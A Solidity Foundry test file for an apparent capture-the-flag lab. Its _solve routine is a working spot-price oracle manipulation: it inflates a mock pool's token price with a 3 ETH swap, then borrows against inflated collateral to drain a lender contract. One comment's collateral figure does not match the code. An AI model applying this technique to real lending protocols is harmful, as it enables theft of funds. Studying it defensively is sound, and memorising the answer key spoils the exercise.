// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Test} from "forge-std/Test.sol";
import {OracleLab, MockToken, SimplePool, SpotLender} from "../src/Setup.sol";

contract Q16OracleSpotTest is Test {
    OracleLab internal lab;

    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");

    function setUp() public {
        lab = new OracleLab();
        vm.deal(address(lab), 100 ether);
        vm.deal(alice, 5 ether);
        vm.deal(bob, 5 ether);
    }

    function _solve(address user) internal {
        vm.startPrank(user);
        lab.createInstance();
        MockToken token = lab.tokenOf(user);
        SimplePool pool = lab.poolOf(user);
        SpotLender lender = lab.lenderOf(user);

        // Inflate the spot price: swap 3 ETH → TKN (pool becomes ETH-heavy,
        // TKN-scarce → price up ~16x).
        pool.swapEthForToken{value: 3 ether}();

        // Approve the lender for collateral and borrow.
        // 32 TKN collateral × inflated price (~0.16 ETH/TKN) ≈ 5.12 ETH loan,
        // capped at lender's 5 ETH balance.
        token.approve(address(lender), type(uint256).max);
        lender.borrow(40e18);

        vm.stopPrank();
    }

    function test_AliceDrainsLender() public {
        uint256 aliceBefore = alice.balance;
        _solve(alice);

        SpotLender lender = lab.lenderOf(alice);
        assertEq(address(lender).balance, 0, "lender drained");
        assertTrue(lab.isSolved(alice));
        // Net wallet change should be: -3 ETH swapped in + 5 ETH borrowed = +2 ETH
        // plus residual TKN in the user's wallet.
        assertGt(alice.balance, aliceBefore + 1 ether, "user net gain > 1 ETH");
    }

    function test_TwoUsersIndependent() public {
        _solve(alice);
        _solve(bob);
        assertTrue(lab.isSolved(alice));
        assertTrue(lab.isSolved(bob));
        // Alice draining her own lender did NOT touch Bob's lender.
        assertTrue(lab.lenderOf(alice) != lab.lenderOf(bob));
    }

    function test_HonestBorrowDoesNotDrain() public {
        vm.startPrank(alice);
        lab.createInstance();
        MockToken token = lab.tokenOf(alice);
        SpotLender lender = lab.lenderOf(alice);

        // Borrow without manipulation — spot price ~ 0.01 ETH/TKN.
        token.approve(address(lender), type(uint256).max);
        lender.borrow(50e18);   // 50 TKN × 0.01 = 0.5 ETH loan
        vm.stopPrank();

        assertEq(address(lender).balance, 4.5 ether, "honest loan tiny");
        assertFalse(lab.isSolved(alice));
    }

    function test_DoubleCreateReverts() public {
        vm.startPrank(alice);
        lab.createInstance();
        vm.expectRevert(bytes("already created"));
        lab.createInstance();
        vm.stopPrank();
    }
}
